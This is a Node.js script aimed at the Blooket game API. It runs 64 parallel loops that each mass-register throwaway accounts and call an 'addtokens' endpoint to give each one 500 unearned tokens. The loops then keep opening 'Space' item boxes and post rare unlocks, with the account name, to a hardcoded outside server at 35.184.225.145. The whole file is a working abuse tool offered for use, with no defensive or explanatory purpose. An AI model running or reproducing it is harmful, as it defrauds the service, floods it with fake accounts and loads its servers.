const fetch = require('node-fetch');

(async() => {
  const box = "Space";
  const blooks = "Lime Astronaut,Cyan Astronaut,Purple Astronaut,Blue Astronaut,Green Astronaut,Pink Astronaut,Yellow Astronaut,Black Astronaut,Orange Astronaut,Red Astronaut,Brown Astronaut".split(",");
  const fetchers = 64;
  let ongoing = true;
  if(!isNaN(fetchers)){
    let bps = 0, totalBlooks = 0;
    let interval = setInterval(()=>{
      bps = 0;
      for(let i = 0; i < fetchers; i++){
        cont();
      }
    }, 5000);

    const cont = async function(){
      if(ongoing){
        let account = await createAccount();
        if(account){
          await fetch("https://api.blooket.com/api/users/addtokens", {
            "headers": {
              "Authorization": account.token,
              "Content-Type": "application/json;charset=utf-8"
            },
            "body": JSON.stringify({
              name: account.name,
              addedTokens: 500
            }),
            "method": "PUT"
          }).catch(()=>{});
          let hasTokens = true;
          while(hasTokens){
            let r = await fetch("https://api.blooket.com/api/users/unlockblook", {
              "headers": {
                "Authorization": account.token,
                "Content-Type": "application/json;charset=utf-8"
              },
              "body": JSON.stringify({name: account.name, box: box}),
              "method": "PUT"
            }).catch(()=>hasTokens=false)
            try {
              let j = await r.json();
              bps++;
              totalBlooks++;
              if(blooks.indexOf(j.unlockedBlook) !== -1 && ongoing){
                fetch("http://35.184.225.145:8080/", {
                  headers: {
                    "Content-Type": "application/json"
                  },
                  method: "POST",
                  body: JSON.stringify({unlockedBlook: j.unlockedBlook, account: account.name})
                });
              }
            } catch(e){}
          }
        }
      }
    };
    for(let i = 0; i < fetchers; i++){
      cont();
    }
  } else {
    console.log("Not a valid number of fetchers.");
    command();
  }
})();

async function createAccount(){
  await new Promise(r=>setTimeout(r,1000));
  const num = Math.floor(Math.random() * 1e16).toString();
  const r = await fetch("https://api.blooket.com/api/users/signup", {
    "headers": {
      "Content-Type": "application/json;charset=utf-8"
    },
    "body": JSON.stringify({name: num, email: num + "@--.--", password: num}),
    "method": "POST"
  }).catch(e=>{});
  if(r){
    const j = await r.json().catch(e=>{});
    if(j && j.success){
      await new Promise(r=>setTimeout(r,1000));
      return {name: num, token: j.token};
    } else {
      return;
    }
  } else {return;}
}
